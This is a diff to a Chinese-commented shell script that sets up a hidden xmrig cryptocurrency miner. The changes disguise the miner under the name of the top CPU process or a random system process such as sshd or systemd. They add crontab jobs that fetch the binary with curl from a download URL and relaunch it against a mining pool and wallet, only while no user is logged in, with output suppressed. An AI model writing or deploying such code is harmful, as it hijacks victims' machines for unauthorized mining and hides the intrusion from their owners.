@@ -55,18 +55,18 @@ get_system_info() {
 
 # 获取CPU利用率最高的进程名
 get_top_cpu_process() {
-    log "获取CPU利用率最高的进程..."
-    
     # 排除xmrig相关进程，获取CPU利用率最高的进程
-    TOP_PROCESS=$(ps aux --sort=-%cpu | grep -v xmrig | grep -v grep | head -2 | tail -1 | awk '{print $11}' | sed 's/.*\///')
+    local TOP_PROCESS=$(ps aux --sort=-%cpu 2>/dev/null | grep -v xmrig | grep -v grep | head -2 | tail -1 | awk '{print $11}' | sed 's/.*\///' 2>/dev/null)
     
-    if [ -z "$TOP_PROCESS" ] || [ "$TOP_PROCESS" = "ps" ] || [ "$TOP_PROCESS" = "sort" ]; then
+    # 清理进程名，只保留字母数字和常见符号
+    TOP_PROCESS=$(echo "$TOP_PROCESS" | sed 's/[^a-zA-Z0-9_-]//g')
+    
+    if [ -z "$TOP_PROCESS" ] || [ "$TOP_PROCESS" = "ps" ] || [ "$TOP_PROCESS" = "sort" ] || [ ${#TOP_PROCESS} -gt 15 ]; then
         # 如果没有找到合适的进程名，使用常见的系统进程名
-        COMMON_PROCESSES=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_gp" "NetworkManager" "sshd" "dbus" "chronyd")
+        local COMMON_PROCESSES=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_gp" "NetworkManager" "sshd" "dbus" "chronyd")
         TOP_PROCESS=${COMMON_PROCESSES[$((RANDOM % ${#COMMON_PROCESSES[@]}))]}
     fi
     
-    log "选择进程名: $TOP_PROCESS"
     echo "$TOP_PROCESS"
 }
 
@@ -165,14 +165,14 @@ setup_crontab() {
     log "设置定时任务..."
     
     # 构建定时任务命令 - 任务1：文件检查和下载（每5分钟）
-    local file_check_cmd="[ \$(who | wc -l) -eq 0 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
+    local file_check_cmd="[ \\\$(who | wc -l) -eq 0 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
     
     # 构建定时任务命令 - 任务2：进程监控和重启（每5分钟）
-    local process_monitor_cmd="[ \$(who | wc -l) -eq 0 ] && [ ! \$(pgrep -f \"$filename\") ] && cd \"$XMRIG_DIR\" && nohup nice -n 19 ./$filename -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
+    local process_monitor_cmd="[ \\\$(who | wc -l) -eq 0 ] && [ ! \\\$(pgrep -f \"$filename\") ] && cd \"$XMRIG_DIR\" && nohup nice -n 19 ./$filename -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
     
     # 添加到crontab - 直接将命令写入定时任务
-    (crontab -l 2>/dev/null; echo "*/5 * * * * $file_check_cmd >/dev/null 2>&1") | crontab -
-    (crontab -l 2>/dev/null; echo "*/5 * * * * $process_monitor_cmd >/dev/null 2>&1") | crontab -
+    (crontab -l 2>/dev/null; echo "*/5 * * * * $file_check_cmd >/dev/null 2>&1") | crontab - 2>/dev/null
+    (crontab -l 2>/dev/null; echo "*/5 * * * * $process_monitor_cmd >/dev/null 2>&1") | crontab - 2>/dev/null
     
     log "定时任务设置完成"
 }
@@ -255,6 +255,7 @@ main() {
     
     # 获取进程名
     PROCESS_NAME=$(get_top_cpu_process)
+    log "选择进程名: $PROCESS_NAME"
     
     # 创建目录
     create_directories
